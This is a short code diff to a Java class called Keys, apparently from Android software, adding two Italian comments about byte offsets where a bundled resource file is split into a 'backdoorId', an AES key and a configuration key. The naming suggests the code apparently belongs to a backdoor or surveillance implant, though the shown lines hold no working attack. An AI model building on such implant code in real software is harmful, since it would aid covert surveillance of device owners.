@@ -117,6 +117,8 @@ public class Keys {
 
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
+			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi perche'
+			// ci servono solo 16 byte
 			backdoorId = Utils.copy(resource, 0, 14);
 			aesKey = Utils.copy(resource, 14, 16);
 			confKey = Utils.copy(resource, 46, 16);
